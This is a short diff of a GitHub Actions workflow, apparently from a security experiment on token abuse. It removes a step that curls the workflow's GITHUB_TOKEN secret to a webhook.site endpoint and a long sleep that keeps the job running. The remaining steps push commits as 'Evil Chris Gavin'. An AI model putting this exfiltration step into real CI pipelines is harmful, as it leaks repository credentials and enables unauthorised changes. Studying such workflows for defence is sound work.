@@ -32,14 +32,12 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          curl --data ${{ secrets.GITHUB_TOKEN }} https://webhook.site/53c6e5df-97be-41d4-a93f-40e5f0c559cf
           git remote set-url origin https://github.com/chrisgavin/2021-02-05.git
           git fetch
           git checkout -b master origin/master
-          echo bar > file
+          echo baz > file
           git config --local user.email "chris+evil@chrisgavin.me"
           git config --local user.name "Evil Chris Gavin"
           git add --all .
           git commit --message "Make changes."
           git push origin master
-          sleep 99999
